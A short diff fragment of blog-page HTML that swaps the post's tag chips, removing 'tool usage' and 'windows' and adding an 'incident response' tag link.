-                        <span class="chip bg-color">工具使用</span>
-                    </a>
-                    
-                    <a href="/tags/windows/">
-                        <span class="chip bg-color">windows</span>
+                    <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+                        <span class="chip bg-color">应急响应</span>
                     </a>
                     
                 </div>
